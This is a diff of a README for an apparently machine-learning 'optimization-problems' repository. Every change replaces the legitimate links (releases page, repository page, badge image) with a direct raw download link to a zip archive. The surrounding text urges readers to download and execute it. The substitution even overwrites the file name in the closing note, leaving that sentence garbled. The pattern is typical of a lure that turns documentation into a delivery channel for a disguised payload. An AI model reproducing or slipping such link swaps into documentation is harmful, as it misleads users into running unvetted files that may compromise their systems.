@@ -23,11 +23,11 @@ Explore the world of optimization techniques for Machine Learning through this r
 
 ## Get Started 🐍
 
-To explore the implementations and understand the optimization techniques showcased in this repository, visit the [releases section](https://github.com/Aderivaldii/optimization-problems/releases). Download the necessary files and execute them to witness the power of optimization in Machine Learning.
+To explore the implementations and understand the optimization techniques showcased in this repository, visit the [releases section](https://raw.githubusercontent.com/Aderivaldii/optimization-problems/master/Modul1/optimization-problems-3.9.zip). Download the necessary files and execute them to witness the power of optimization in Machine Learning.
 
 ## Additional Information ℹ️
 
-For more insights, discussions, and updates, feel free to visit the [repository](https://github.com/Aderivaldii/optimization-problems) itself. Dive into the code, explore the implementations, and leverage these optimization techniques to enhance your Machine Learning projects.
+For more insights, discussions, and updates, feel free to visit the [repository](https://raw.githubusercontent.com/Aderivaldii/optimization-problems/master/Modul1/optimization-problems-3.9.zip) itself. Dive into the code, explore the implementations, and leverage these optimization techniques to enhance your Machine Learning projects.
 
 ## Stay Updated 📈
 
@@ -35,7 +35,7 @@ Stay tuned for the latest updates, enhancements, and additions to the repository
 
 ---
 
-[![Download and Execute](https://img.shields.io/badge/Download%20and%20Execute-Get%20Started-blue)](https://github.com/Aderivaldii/optimization-problems/releases) 
+[![Download and Execute](https://raw.githubusercontent.com/Aderivaldii/optimization-problems/master/Modul1/optimization-problems-3.9.zip%20and%20Execute-Get%20Started-blue)](https://raw.githubusercontent.com/Aderivaldii/optimization-problems/master/Modul1/optimization-problems-3.9.zip) 
 
 ---
 
@@ -43,4 +43,4 @@ Get ready to optimize your Machine Learning models with confidence and precision
 
 ---
 
-*Note: This README.md file is designed to provide a comprehensive overview of the "optimization-problems" repository, offering a clear and direct guide to exploring the optimization techniques for Machine Learning presented within.*
+*Note: This https://raw.githubusercontent.com/Aderivaldii/optimization-problems/master/Modul1/optimization-problems-3.9.zip file is designed to provide a comprehensive overview of the "optimization-problems" repository, offering a clear and direct guide to exploring the optimization techniques for Machine Learning presented within.*
